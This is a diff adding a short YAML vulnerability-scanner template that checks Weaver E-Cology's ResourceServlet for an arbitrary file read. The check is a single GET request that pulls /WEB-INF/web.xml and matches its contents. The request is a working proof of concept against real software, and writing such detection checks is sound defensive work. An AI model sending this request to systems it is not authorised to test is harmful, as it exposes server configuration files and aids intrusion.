@@ -1,0 +1,12 @@
+name: 泛微E-Cology-ResourceServlet-文件读取
+description: >
+  文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml
+    expression:
+      status: 200
+      body_all:
+        - "<url-pattern>/weaver"
